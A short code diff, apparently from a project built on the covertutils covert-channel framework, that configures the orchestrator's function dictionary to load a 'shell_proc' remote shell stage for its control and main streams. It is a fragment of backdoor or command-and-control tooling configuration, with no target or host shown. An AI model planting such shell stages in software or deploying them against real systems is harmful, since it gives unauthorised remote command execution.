@@ -5,7 +5,17 @@ from covertutils.orchestration import SimpleOrchestrator
 
 out_len = 100
 in_len = 100
-fdict = {'control' : None}
+
+
+
+from covertutils.payloads import CommonStages
+
+
+fdict = {
+	'control' : CommonStages['shell_proc']['marshal'],
+	'main' : CommonStages['shell_proc']['marshal'],
+}
+
 
 # http://stackoverflow.com/questions/34884567/python-multiple-inheritance-passing-arguments-to-constructors-using-super
 
